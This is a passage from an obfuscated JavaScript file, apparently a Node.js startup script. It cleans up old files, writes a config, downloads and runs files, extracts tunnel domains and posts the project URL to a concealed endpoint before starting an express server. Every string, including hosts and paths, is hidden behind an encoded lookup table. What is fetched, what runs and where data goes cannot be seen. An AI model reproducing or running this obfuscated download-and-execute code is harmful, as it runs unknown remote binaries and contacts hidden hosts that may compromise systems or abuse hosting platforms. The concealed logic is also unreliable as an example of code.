axios[_0x24d3b2(0x117)](_0x24d3b2(0xb0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x24d3b2(0x133)}});return console[_0x24d3b2(0xf5)](_0x24d3b2(0xfe)),_0x6c5708;}catch(_0xf0c084){return console[_0x24d3b2(0x12c)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xf0c084[_0x24d3b2(0x126)]),null;}}async function startserver(){const _0x48171b=_0x2b2aaf;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2cd5ce){console[_0x48171b(0x12c)](_0x48171b(0x70),_0x2cd5ce);}}startserver()[_0x2b2aaf(0xfb)](_0x455007=>{const _0x368d22=_0x2b2aaf;console[_0x368d22(0x12c)](_0x368d22(0x10c),_0x455007);}),app[_0x2b2aaf(0x88)](PORT,()=>console['log'](_0x2b2aaf(0x12f)+PORT+'!'));
